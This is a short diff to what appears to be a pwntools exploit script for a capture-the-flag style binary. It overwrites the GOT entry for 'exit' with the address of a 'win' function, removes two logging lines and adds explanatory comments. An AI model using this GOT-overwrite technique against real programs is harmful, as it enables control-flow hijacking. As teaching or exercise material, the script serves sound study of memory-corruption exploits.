@@ -168,10 +168,8 @@ exit_got = elf.got['exit']
 #here it access win as a symbol because a symbol it's a variable or a function, inside of the binary (not coming from external libraries).
 win_addr = elf.symbols['win']
 
-log.info("Address of 'exit' .got.plt entry: {}".format(hex(exit_got)))
-log.info("Address of 'win': {}".format(hex(win_addr)))
-
 #override got exit entry with win address
+#note that we are converting it to a string because they are numbers ('%d')
 io.sendlineafter('address\n', str(exit_got))
 io.sendlineafter('value?\n', str(win_addr))
 
